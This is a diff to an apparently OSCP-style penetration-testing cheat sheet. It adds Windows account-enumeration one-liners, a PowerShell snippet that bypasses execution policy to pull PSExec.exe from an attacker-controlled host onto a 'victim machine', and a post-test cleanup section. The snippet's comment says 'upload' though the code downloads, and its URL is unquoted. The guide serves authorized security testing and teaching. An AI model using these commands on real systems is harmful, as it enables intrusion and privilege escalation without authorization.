@@ -81,6 +81,7 @@
   - [Post Exploitation](#post-exploitation)
     - [Escalating privileges on Windows](#escalating-privileges-on-windows)
     - [Escalating privileges on Linux](#escalating-privileges-on-linux)
+    - [Cleanup](#cleanup)
   - [Advanced Tips and Techniques](#advanced-tips-and-techniques)
   - [Document the Result](#document-the-result)
 - [Footnotes](#footnotes)
@@ -1190,6 +1191,25 @@ You've got a shell! Now, what!?
   - `c:\sysprepsysprep.xml`
   - `%WINDIR%\Panther\Unattend\Unattended.xml`
   - `%WINDIR%\Panther\Unattended.xml`
+
+| Command | Description |
+| --- | --- |
+| `for /F "skip=1" %i in ('wmic useraccount get name') do net user %i >> users.txt` | Use `wmic` to query user accounts and get more data using `net` command |
+| `for /F "delims=* tokens=1 skip=4" %i in ('net localgroup') do net localgroup %i >> groups.txt` | Using `net` command to get localgroups and then more information about them |
+
+```powershell
+# script.ps1
+# This is a script to upload a file from the victim machine
+# make sure you have your web server started
+# e.g., in Kali
+# $ service http2 start
+# Execute the script with this command
+# PS> powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1
+$client = New-Object System.Net.WebClient
+$targetLocation = http://<kali's IP address>/PSExec.exe
+$client.DownloadFile($targetLocation,"psexec.exe")
+```
+
 ### Escalating privileges on Linux
 - Dirty Cow for Ubuntu > 15.04
 - Overlayfs for Ubuntu <= 15.04. Available in Metasploit. Requires buteforcing a service (usually ssh)
@@ -1217,6 +1237,11 @@ echo os.system('/bin/bash')
 | `find / \( -perm -o w -perm -o x \) -type d 2>/dev/null` | World-writable and executable folders |
 | `find / -name [perl*|python*|ruby*|gcc*|cc]` | Development tools in the machine |
 | `find / -name [wget|nc*|netcat*|tftp*|ftp]` | File transfer tools |
+
+### Cleanup
+Once exploitation has been proved, we must reverse the machines to their previous state. This might include activities like:
+- removing from the target system executables, scripts, temporary files, user accounts installed and used, etc.
+- resetting systems settings and configuration, if modified.
 
 ## Advanced Tips and Techniques
 
